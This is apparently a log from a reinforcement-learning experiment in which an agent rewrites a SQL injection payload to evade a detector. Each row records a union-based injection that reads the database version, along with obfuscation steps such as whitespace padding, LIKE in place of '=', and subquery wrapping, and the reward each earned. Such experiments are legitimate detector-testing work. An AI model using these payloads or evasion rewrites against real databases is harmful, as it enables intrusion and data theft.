;episode;step;original_payload;state;action;next_state;reward;win
0;1;1;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";3;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";0.7794871651914701;0
1;1;2;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";10;"""
 select
 *
 from
 users
 where
 id
 =
 '1'
 or
 $+<$
 union
 select
 1,@@VERSION
 --
 1'""";1.1999999515712279;0
2;1;3;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
 select
 *
 from
 users
 where
 id
 =
 '1'
 or
 $+<$
 union
 select
 1,@@VERSION
 --
 1'""";25;"""
 select
 *
 from
 users
 where
 id
 =
 '1'
 or
 $+<$
 union
 select
 1,@@VERSION
 --
 1'""";1.099999951571228;0
3;1;4;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
 select
 *
 from
 users
 where
 id
 =
 '1'
 or
 $+<$
 union
 select
 1,@@VERSION
 --
 1'""";9;"""
	 select
	 *
	 from
	 users
	 where
	 id
	 =
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";1.5434782966999574;0
4;1;5;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	 =
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";16;"""
	 select
	 *
	 from
	 users
	 where
	 id
	 =
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";1.4434782966999573;0
5;1;6;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	 =
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";2;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";1.2076923478196369;0
6;1;7;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";18;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";1.1076923478196368;0
7;1;8;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 1,@@VERSION
	 --
	 1'""";8;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.7999999217689079;0
8;1;9;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";19;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.6999999217689079;0
9;1;10;""" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'""";"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";11;"""
	 select
	 *
	 from
	 users
	 where
	 id
	  LIKE 
	 '1'
	 or
	 $+<$
	 union
	 select
	 (SELECT 1),@@VERSION
	 --
	 1'""";0.35454540186184713;0
